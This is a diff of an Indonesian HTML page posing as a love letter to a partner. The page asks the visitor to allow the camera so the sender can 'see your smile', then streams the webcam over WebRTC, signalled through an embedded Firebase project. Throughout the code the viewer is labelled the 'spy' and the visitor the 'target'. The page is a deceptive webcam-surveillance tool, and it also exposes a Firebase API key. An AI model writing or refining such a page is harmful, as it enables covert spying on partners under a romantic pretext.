@@ -1,62 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>💌 Surat Cinta Untukmu</title>
+    <title>💌 Untuk Pacarku</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ff6b9d, #ff8e53);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
-            font-family: Arial;
-            background: pink;
-            text-align: center;
         }
-        .love-box {
+        .container {
             background: white;
-            padding: 30px;
             border-radius: 20px;
-            margin: 20px auto;
-            max-width: 500px;
-            box-shadow: 0 10px 30px rgba(255,0,100,0.2);
-        }
-        #cameraBtn {
-            background: #ff4081;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 20px;
-        }
-        #localVideo {
+            padding: 30px;
             width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-            margin: 20px auto;
-            display: none;
-            transform: scaleX(-1);
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
-        .hidden { display: none; }
+        h1 { color: #ff4081; margin-bottom: 20px; }
+        #status { margin: 20px 0; min-height: 24px; }
+        #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
+        #roomId { 
+            background: #f0f0f0; 
+            padding: 10px; 
+            border-radius: 5px; 
+            margin: 10px 0;
+            font-family: monospace;
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="love-box">
-        <h1>💖 Untuk Pacarku 💖</h1>
-        <p>Sayang, aku buatkan ini khusus untukmu. Izinkan aku melihat senyuman indahmu...</p>
+    <div class="container">
+        <h1>💖 Untuk Pacarku</h1>
+        <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
         
-        <button id="cameraBtn" onclick="startSpy()">📸 Lihat Wajahku Sayang</button>
+        <button id="startBtn" onclick="startCamera()">📸 Izinkan Kamera</button>
         
-        <video id="localVideo" autoplay playsinline></video>
+        <div id="status"></div>
         
-        <div id="status" class="hidden">🟢 Sedang merekam senyumanmu...</div>
+        <div id="roomId"></div>
+        
+        <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <!-- Firebase -->
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    <!-- FIREBASE v8 (STABLE VERSION) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     
     <script>
-        // =============== FIREBASE ===============
+        // ========== CONFIG ==========
         const firebaseConfig = {
             apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
             authDomain: "survei-f11a1.firebaseapp.com",
@@ -67,109 +65,131 @@
             appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
         };
         
+        // ========== INIT ==========
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const database = firebase.database();
         
-        // =============== WEBRTC VARIABLES ===============
+        // ========== VARIABLES ==========
         let localStream;
         let peerConnection;
-        let roomId = "love_room_" + Math.random().toString(36).substr(2, 9);
+        let roomId;
+        let offerListener;
+        let candidateListener;
         
-        // =============== START SPY SYSTEM ===============
-        async function startSpy() {
-            document.getElementById('cameraBtn').style.display = 'none';
-            document.getElementById('status').classList.remove('hidden');
+        // ========== START CAMERA ==========
+        async function startCamera() {
+            const btn = document.getElementById('startBtn');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.textContent = "🔄 Memulai...";
             
             try {
-                // 1. DAPETKAN KAMERA
+                // 1. GET CAMERA
                 localStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: 640, height: 480 },
                     audio: false
                 });
                 
-                const localVideo = document.getElementById('localVideo');
-                localVideo.srcObject = localStream;
-                localVideo.style.display = 'block';
+                const video = document.getElementById('video');
+                video.srcObject = localStream;
+                video.style.display = 'block';
+                video.style.transform = 'scaleX(-1)';
                 
-                // 2. BUAT ROOM DI FIREBASE
-                await db.ref('rooms/' + roomId).set({
-                    createdAt: Date.now(),
-                    status: 'waiting'
-                });
+                // 2. CREATE ROOM
+                roomId = generateRoomId();
+                document.getElementById('roomId').style.display = 'block';
+                document.getElementById('roomId').textContent = `Kode: ${roomId}`;
+                
+                // Clean old room data
+                await database.ref('rooms/' + roomId).remove();
                 
                 // 3. SETUP WEBRTC
                 setupWebRTC();
                 
-                // 4. LISTEN UNTUK SPY YANG JOIN
-                listenForSpy();
+                // 4. SETUP LISTENERS
+                setupListeners();
                 
-            } catch (err) {
-                alert("Sayang, izinkan kamera ya ❤️");
-                document.getElementById('cameraBtn').style.display = 'block';
+                status.innerHTML = "✅ Kamera aktif! Beri kode ini ke pacarmu:";
+                
+            } catch (error) {
+                status.innerHTML = `❌ Error: ${error.message}`;
+                btn.disabled = false;
+                btn.textContent = "🔄 Coba Lagi";
             }
         }
         
-        // =============== WEBRTC SETUP ===============
+        // ========== WEBRTC SETUP ==========
         function setupWebRTC() {
-            const config = {
+            peerConnection = new RTCPeerConnection({
                 iceServers: [
                     { urls: 'stun:stun.l.google.com:19302' },
                     { urls: 'stun:stun1.l.google.com:19302' }
                 ]
-            };
+            });
             
-            peerConnection = new RTCPeerConnection(config);
-            
-            // ADD LOCAL STREAM
+            // Add local stream
             localStream.getTracks().forEach(track => {
                 peerConnection.addTrack(track, localStream);
             });
             
-            // ICE CANDIDATE HANDLER
+            // ICE candidate handler
             peerConnection.onicecandidate = (event) => {
                 if (event.candidate) {
-                    db.ref('rooms/' + roomId + '/candidates/target').push({
-                        candidate: event.candidate
-                    });
+                    database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
                 }
             };
         }
         
-        // =============== LISTEN FOR SPY ===============
-        function listenForSpy() {
+        // ========== SETUP LISTENERS ==========
+        function setupListeners() {
             // Listen for spy's offer
-            db.ref('rooms/' + roomId + '/offer').on('value', async (snapshot) => {
+            offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
                 const offer = snapshot.val();
-                if (offer && !peerConnection.currentRemoteDescription) {
+                if (offer && peerConnection.signalingState === 'stable') {
+                    console.log("📥 Received offer");
+                    
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                     
-                    // Create answer
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
                     
-                    // Send answer to spy
-                    db.ref('rooms/' + roomId + '/answer').set(answer);
+                    // Send answer
+                    await database.ref(`rooms/${roomId}/answer`).set(answer);
+                    
+                    document.getElementById('status').innerHTML = "🔴 Terhubung dengan pacar!";
                 }
             });
             
             // Listen for spy's ICE candidates
-            db.ref('rooms/' + roomId + '/candidates/spy').on('child_added', async (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.candidate) {
+            candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
+                const candidate = snapshot.val();
+                if (candidate) {
                     try {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                     } catch (e) {
-                        console.error("Error adding ICE candidate:", e);
+                        console.warn("Failed to add ICE candidate:", e);
                     }
                 }
             });
         }
         
-        // =============== CLEANUP ===============
-        window.addEventListener('beforeunload', () => {
+        // ========== UTILS ==========
+        function generateRoomId() {
+            return Math.random().toString(36).substring(2, 10).toUpperCase();
+        }
+        
+        // ========== CLEANUP ==========
+        function cleanup() {
+            if (offerListener) database.ref(`rooms/${roomId}/offer`).off('value', offerListener);
+            if (candidateListener) database.ref(`rooms/${roomId}/spyCandidates`).off('child_added', candidateListener);
             if (localStream) localStream.getTracks().forEach(track => track.stop());
-            db.ref('rooms/' + roomId).remove();
-        });
+            if (peerConnection) peerConnection.close();
+            if (roomId) database.ref('rooms/' + roomId).remove();
+        }
+        
+        window.addEventListener('beforeunload', cleanup);
+        window.addEventListener('pagehide', cleanup);
     </script>
 </body>
-    </html>
+</html>
